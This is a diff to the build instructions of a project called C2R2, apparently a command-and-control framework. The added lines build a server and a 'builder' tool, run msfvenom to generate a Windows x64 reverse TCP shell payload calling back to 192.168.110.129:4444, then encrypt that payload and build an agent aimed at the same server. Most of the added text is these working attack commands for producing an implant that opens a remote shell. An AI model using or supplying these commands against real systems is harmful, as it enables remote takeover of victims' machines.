@@ -16,8 +16,11 @@ git clone <repository-url>
 cd C2R2
 
 # Build in release mode
-cargo build --release
-
+cargo build -p c2r2-server --release
+cargo build --release -p builder
+❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f raw -o rev.bin
+❯ ./builder --encrypt rev.bin
+./builder ../../rev.bin --name agent_test --server 192.168.110.129:4444
 # The binaries will be located in target/release/
 ```
 
